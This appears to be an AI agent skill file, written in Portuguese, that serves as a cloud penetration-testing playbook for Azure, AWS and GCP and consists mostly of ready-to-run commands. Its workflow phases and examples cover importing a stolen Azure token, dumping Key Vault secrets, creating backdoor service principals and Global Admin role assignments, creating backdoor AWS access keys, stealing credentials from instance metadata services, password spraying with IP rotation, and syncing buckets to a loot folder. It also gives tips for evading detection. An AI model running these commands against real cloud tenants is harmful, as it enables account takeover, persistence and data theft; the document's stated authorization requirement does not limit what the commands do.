---
name: Testes de Penetração em Nuvem
description: Esta skill deve ser usada quando o usuário pede para "realizar testes de penetração em nuvem", "avaliar segurança do Azure, AWS ou GCP", "enumerar recursos em nuvem", "explorar configurações incorretas em nuvem", "testar segurança do O365", "extrair secrets de ambientes em nuvem" ou "auditar infraestrutura em nuvem". Fornece técnicas abrangentes para avaliação de segurança em plataformas de nuvem principais.
metadata:
  author: zebbern
  version: "1.1"
---

# Testes de Penetração em Nuvem

## Propósito

Conduzir avaliações de segurança abrangentes da infraestrutura em nuvem através do Microsoft Azure, Amazon Web Services (AWS) e Google Cloud Platform (GCP). Esta skill cobre reconhecimento, testes de autenticação, enumeração de recursos, escalação de privilégios, extração de dados e técnicas de persistência para engajamentos autorizados de segurança em nuvem.

## Pré-requisitos

### Ferramentas Obrigatórias
```bash
# Ferramentas Azure
Install-Module -Name Az -AllowClobber -Force
Install-Module -Name MSOnline -Force
Install-Module -Name AzureAD -Force

# AWS CLI
curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
unzip awscliv2.zip && sudo ./aws/install

# GCP CLI
curl https://sdk.cloud.google.com | bash
gcloud init

# Ferramentas adicionais
pip install scoutsuite pacu
```

### Conhecimento Obrigatório
- Fundamentos de arquitetura em nuvem
- Identity and Access Management (IAM)
- Mecanismos de autenticação de API
- Conceitos de DevOps e automação

### Acesso Obrigatório
- Autorização escrita para realização de testes
- Credenciais de teste ou tokens de acesso
- Escopo definido e regras de engajamento

## Saídas e Entregas

1. **Relatório de Avaliação de Segurança em Nuvem** - Conclusões abrangentes e classificações de risco
2. **Inventário de Recursos** - Serviços enumerados, armazenamento e instâncias de computação
3. **Conclusões de Credenciais** - Secrets expostos, chaves e configurações incorretas
4. **Recomendações de Remediação** - Orientação de hardening por plataforma

## Fluxo de Trabalho Principal

### Fase 1: Reconhecimento

Coletar informações iniciais sobre presença em nuvem do alvo:

```bash
# Azure: Obter informações de federação
curl "https://login.microsoftonline.com/getuserrealm.srf?login=user@target.com&xml=1"

# Azure: Obter ID do Tenant
curl "https://login.microsoftonline.com/target.com/v2.0/.well-known/openid-configuration"

# Enumerar recursos em nuvem pelo nome da empresa
python3 cloud_enum.py -k targetcompany

# Verificar IP em relação a provedores de nuvem
cat ips.txt | python3 ip2provider.py
```

### Fase 2: Autenticação no Azure

Autenticar em ambientes Azure:

```powershell
# Módulo Az PowerShell
Import-Module Az
Connect-AzAccount

# Com credenciais (pode contornar MFA)
$credential = Get-Credential
Connect-AzAccount -Credential $credential

# Importar contexto roubado
Import-AzContext -Profile 'C:\Temp\StolenToken.json'

# Exportar contexto para persistência
Save-AzContext -Path C:\Temp\AzureAccessToken.json

# Módulo MSOnline
Import-Module MSOnline
Connect-MsolService
```

### Fase 3: Enumeração do Azure

Descobrir recursos e permissões do Azure:

```powershell
# Listar contextos e assinaturas
Get-AzContext -ListAvailable
Get-AzSubscription

# Atribuições de função do usuário atual
Get-AzRoleAssignment

# Listar recursos
Get-AzResource
Get-AzResourceGroup

# Contas de armazenamento
Get-AzStorageAccount

# Aplicações web
Get-AzWebApp

# Servidores e bancos de dados SQL
Get-AzSQLServer
Get-AzSqlDatabase -ServerName $Server -ResourceGroupName $RG

# Máquinas virtuais
Get-AzVM
$vm = Get-AzVM -Name "VMName"
$vm.OSProfile

# Listar todos os usuários
Get-MSolUser -All

# Listar todos os grupos
Get-MSolGroup -All

# Administradores globais
Get-MsolRole -RoleName "Company Administrator"
Get-MSolGroupMember -GroupObjectId $GUID

# Service Principals
Get-MsolServicePrincipal
```

### Fase 4: Exploração do Azure

Explorar configurações incorretas do Azure:

```powershell
# Pesquisar atributos de usuário em busca de senhas
$users = Get-MsolUser -All
foreach($user in $users){
    $props = @()
    $user | Get-Member | foreach-object{$props+=$_.Name}
    foreach($prop in $props){
        if($user.$prop -like "*password*"){
            Write-Output ("[*]" + $user.UserPrincipalName + "[" + $prop + "]" + " : " + $user.$prop)
        }
    }
}

# Executar comandos em VMs
Invoke-AzVMRunCommand -ResourceGroupName $RG -VMName $VM -CommandId RunPowerShellScript -ScriptPath ./script.ps1

# Extrair UserData de VM
$vms = Get-AzVM
$vms.UserData

# Despejar secrets do Key Vault
az keyvault list --query '[].name' --output tsv
az keyvault set-policy --name <vault> --upn <user> --secret-permissions get list
az keyvault secret list --vault-name <vault> --query '[].id' --output tsv
az keyvault secret show --id <URI>
```

### Fase 5: Persistência no Azure

Estabelecer persistência no Azure:

```powershell
# Criar service principal backdoor
$spn = New-AzAdServicePrincipal -DisplayName "WebService" -Role Owner
$BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($spn.Secret)
$UnsecureSecret = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)

# Adicionar service principal a Global Admin
$sp = Get-MsolServicePrincipal -AppPrincipalId <AppID>
$role = Get-MsolRole -RoleName "Company Administrator"
Add-MsolRoleMember -RoleObjectId $role.ObjectId -RoleMemberType ServicePrincipal -RoleMemberObjectId $sp.ObjectId

# Fazer login como service principal
$cred = Get-Credential  # AppID como nome de usuário, secret como senha
Connect-AzAccount -Credential $cred -Tenant "tenant-id" -ServicePrincipal

# Criar novo usuário admin via CLI
az ad user create --display-name <name> --password <pass> --user-principal-name <upn>
```

### Fase 6: Autenticação na AWS

Autenticar em ambientes AWS:

```bash
# Configurar AWS CLI
aws configure
# Inserir: Access Key ID, Secret Access Key, Region, Output format

# Usar profile específico
aws configure --profile target

# Testar credenciais
aws sts get-caller-identity
```

### Fase 7: Enumeração da AWS

Descobrir recursos AWS:

```bash
# Informações da conta
aws sts get-caller-identity
aws iam list-users
aws iam list-roles

# Buckets S3
aws s3 ls
aws s3 ls s3://bucket-name/
aws s3 sync s3://bucket-name ./local-dir

# Instâncias EC2
aws ec2 describe-instances

# Bancos de dados RDS
aws rds describe-db-instances --region us-east-1

# Funções Lambda
aws lambda list-functions --region us-east-1
aws lambda get-function --function-name <name>

# Clusters EKS
aws eks list-clusters --region us-east-1

# Networking
aws ec2 describe-subnets
aws ec2 describe-security-groups --group-ids <sg-id>
aws directconnect describe-connections
```

### Fase 8: Exploração da AWS

Explorar configurações incorretas da AWS:

```bash
# Verificar snapshots RDS públicos
aws rds describe-db-snapshots --snapshot-type manual --query=DBSnapshots[*].DBSnapshotIdentifier
aws rds describe-db-snapshot-attributes --db-snapshot-identifier <id>
# AttributeValues = "all" significa acessível publicamente

# Extrair variáveis de ambiente de Lambda (podem conter secrets)
aws lambda get-function --function-name <name> | jq '.Configuration.Environment'

# Acessar metadata service (de EC2 comprometido)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Acesso IMDSv2
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl http://169.254.169.254/latest/meta-data/profile -H "X-aws-ec2-metadata-token: $TOKEN"
```

### Fase 9: Persistência na AWS

Estabelecer persistência na AWS:

```bash
# Listar chaves de acesso existentes
aws iam list-access-keys --user-name <username>

# Criar chave de acesso backdoor
aws iam create-access-key --user-name <username>

# Obter todos os IPs públicos EC2
for region in $(cat regions.txt); do
    aws ec2 describe-instances --query=Reservations[].Instances[].PublicIpAddress --region $region | jq -r '.[]'
done
```

### Fase 10: Enumeração do GCP

Descobrir recursos GCP:

```bash
# Autenticação
gcloud auth login
gcloud auth activate-service-account --key-file creds.json
gcloud auth list

# Informações da conta
gcloud config list
gcloud organizations list
gcloud projects list

# Políticas IAM
gcloud organizations get-iam-policy <org-id>
gcloud projects get-iam-policy <project-id>

# Serviços habilitados
gcloud services list

# Repositórios de código-fonte
gcloud source repos list
gcloud source repos clone <repo>

# Instâncias de computação
gcloud compute instances list
gcloud beta compute ssh --zone "region" "instance" --project "project"

# Buckets de armazenamento
gsutil ls
gsutil ls -r gs://bucket-name
gsutil cp gs://bucket/file ./local

# Instâncias SQL
gcloud sql instances list
gcloud sql databases list --instance <id>

# Kubernetes
gcloud container clusters list
gcloud container clusters get-credentials <cluster> --region <region>
kubectl cluster-info
```

### Fase 11: Exploração do GCP

Explorar configurações incorretas do GCP:

```bash
# Obter dados do metadata service
curl "http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=text" -H "Metadata-Flavor: Google"

# Verificar escopos de acesso
curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes -H 'Metadata-Flavor:Google'

# Descriptografar dados com keyring
gcloud kms decrypt --ciphertext-file=encrypted.enc --plaintext-file=out.txt --key <key> --keyring <keyring> --location global

# Análise de função serverless
gcloud functions list
gcloud functions describe <name>
gcloud functions logs read <name> --limit 100

# Encontrar credenciais armazenadas
sudo find /home -name "credentials.db"
sudo cp -r /home/user/.config/gcloud ~/.config
gcloud auth list
```

## Referência Rápida

### Comandos Principais do Azure

| Ação | Comando |
|--------|---------|
| Login | `Connect-AzAccount` |
| Listar assinaturas | `Get-AzSubscription` |
| Listar usuários | `Get-MsolUser -All` |
| Listar grupos | `Get-MsolGroup -All` |
| Funções atuais | `Get-AzRoleAssignment` |
| Listar VMs | `Get-AzVM` |
| Listar armazenamento | `Get-AzStorageAccount` |
| Secrets do Key Vault | `az keyvault secret list --vault-name <name>` |

### Comandos Principais da AWS

| Ação | Comando |
|--------|---------|
| Configurar | `aws configure` |
| Identidade do chamador | `aws sts get-caller-identity` |
| Listar usuários | `aws iam list-users` |
| Listar buckets S3 | `aws s3 ls` |
| Listar EC2 | `aws ec2 describe-instances` |
| Listar Lambda | `aws lambda list-functions` |
| Metadata | `curl http://169.254.169.254/latest/meta-data/` |

### Comandos Principais do GCP

| Ação | Comando |
|--------|---------|
| Login | `gcloud auth login` |
| Listar projetos | `gcloud projects list` |
| Listar instâncias | `gcloud compute instances list` |
| Listar buckets | `gsutil ls` |
| Listar clusters | `gcloud container clusters list` |
| Política IAM | `gcloud projects get-iam-policy <project>` |
| Metadata | `curl -H "Metadata-Flavor: Google" http://metadata.google.internal/...` |

### URLs do Metadata Service

| Provedor | URL |
|----------|-----|
| AWS | `http://169.254.169.254/latest/meta-data/` |
| Azure | `http://169.254.169.254/metadata/instance?api-version=2018-02-01` |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` |

### Ferramentas Úteis

| Ferramenta | Propósito |
|------|---------|
| ScoutSuite | Auditoria de segurança multi-cloud |
| Pacu | Framework de exploração AWS |
| AzureHound | Mapeamento de caminho de ataque do Azure AD |
| ROADTools | Enumeração do Azure AD |
| WeirdAAL | Enumeração de serviço AWS |
| MicroBurst | Avaliação de segurança do Azure |
| PowerZure | Pós-exploração do Azure |

## Restrições e Limitações

### Requisitos Legais
- Testar apenas com autorização escrita explícita
- Respeitar limites de escopo entre contas de nuvem
- Não acessar dados de clientes em produção
- Documentar todas as atividades de teste

### Limitações Técnicas
- MFA pode prevenir ataques baseados em credenciais
- Políticas de Acesso Condicional podem restringir acesso
- CloudTrail/Activity Logs registram todas as chamadas de API
- Alguns recursos exigem acesso regional específico

### Considerações de Detecção
- Provedores de nuvem registram toda atividade de API
- Padrões de acesso incomuns acionam alertas
- Usar enumeração lenta e deliberada
- Considerar GuardDuty, Security Center, Cloud Armor

## Exemplos

### Exemplo 1: Azure Password Spray

**Cenário:** Testar política de senha do Azure AD

```powershell
# Usando MSOLSpray com FireProx para rotação de IP
# Primeiro criar endpoint FireProx
python fire.py --access_key <key> --secret_access_key <secret> --region us-east-1 --url https://login.microsoft.com --command create

# Spray de senhas
Import-Module .\MSOLSpray.ps1
Invoke-MSOLSpray -UserList .\users.txt -Password "Spring2024!" -URL https://<api-gateway>.execute-api.us-east-1.amazonaws.com/fireprox
```

### Exemplo 2: Enumeração de Bucket S3 da AWS

**Cenário:** Encontrar e acessar buckets S3 configurados incorretamente

```bash
# Listar todos os buckets
aws s3 ls | awk '{print $3}' > buckets.txt

# Verificar cada bucket para conteúdo
while read bucket; do
    echo "Checking: $bucket"
    aws s3 ls s3://$bucket 2>/dev/null
done < buckets.txt

# Baixar bucket interessante
aws s3 sync s3://misconfigured-bucket ./loot/
```

### Exemplo 3: Comprometimento de Service Account do GCP

**Cenário:** Fazer pivot usando service account comprometido

```bash
# Autenticar com chave de service account
gcloud auth activate-service-account --key-file compromised-sa.json

# Listar projetos acessíveis
gcloud projects list

# Enumerar instâncias de computação
gcloud compute instances list --project target-project

# Verificar chaves SSH em metadata
gcloud compute project-info describe --project target-project | grep ssh

# SSH para instância
gcloud beta compute ssh instance-name --zone us-central1-a --project target-project
```

## Solução de Problemas

| Problema | Soluções |
|-------|-----------|
| Falhas de autenticação | Verificar credenciais; verificar MFA; garantir tenant/projeto correto; tentar métodos de autenticação alternativos |
| Permissão negada | Listar funções atuais; tentar diferentes recursos; verificar políticas de recursos; verificar região |
| Metadata service bloqueado | Verificar IMDSv2 (AWS); verificar role de instância; verificar firewall para 169.254.169.254 |
| Rate limiting | Adicionar delays; distribuir entre regiões; usar múltiplas credenciais; focar em alvos de alto valor |

## Referências

- [Advanced Cloud Scripts](references/advanced-cloud-scripts.md) - Runbooks de Automação do Azure, enumeração de Function Apps, exfiltração de dados AWS, exploração avançada do GCP